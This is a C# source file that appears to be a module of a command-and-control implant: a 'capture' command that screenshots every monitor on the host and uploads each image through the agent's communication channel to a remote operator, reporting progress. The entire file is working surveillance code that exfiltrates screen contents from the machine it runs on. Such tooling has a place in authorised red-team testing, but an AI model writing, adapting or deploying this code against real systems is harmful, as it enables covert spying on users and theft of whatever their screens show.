using Agent.Commands;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class CaptureCommand : AgentCommand
    {
        public override string Name => "capture";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            List<TaskFileResult> files = new List<TaskFileResult>();
            int screenId = 1;
            foreach (var screen in Screen.AllScreens)
            {
                Rectangle rc = screen.Bounds;
                var image = new Bitmap(rc.Width, rc.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                using (Graphics memGraph = Graphics.FromImage(image))
                {
                    memGraph.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                }

                ImageConverter converter = new ImageConverter();
                var buff = (byte[])converter.ConvertTo(image, typeof(byte[]));

                var filename = $"Capture_{screenId}_{Guid.NewGuid()}.png";
                var fileId = commm.Upload(buff, filename, a =>
                {
                    result.Info = $"Uploading {filename} ({a}%)";
                    commm.SendResult(result);
                }).Result;

                result.Result += $"Screen #{screenId} Captured to {filename}!"+ Environment.NewLine;
                files.Add(new TaskFileResult() { FileId = fileId, FileName = filename });
                screenId++;
            }

            result.Files.AddRange(files);
        }
    }
}
